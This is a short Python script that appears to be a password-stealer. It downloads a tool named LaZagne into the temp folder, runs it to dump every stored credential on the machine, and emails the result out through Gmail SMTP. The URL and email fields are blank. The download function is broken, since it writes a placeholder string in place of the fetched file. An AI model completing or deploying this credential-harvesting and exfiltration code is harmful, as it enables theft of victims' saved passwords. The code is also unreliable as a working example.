#!/usr/bin/env python
import requests
import subprocess
import smtplib
import os
import tempfile

def download(url):
    get_request = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write("this is a test")

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
download("") #lazagne
result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail("", "", result)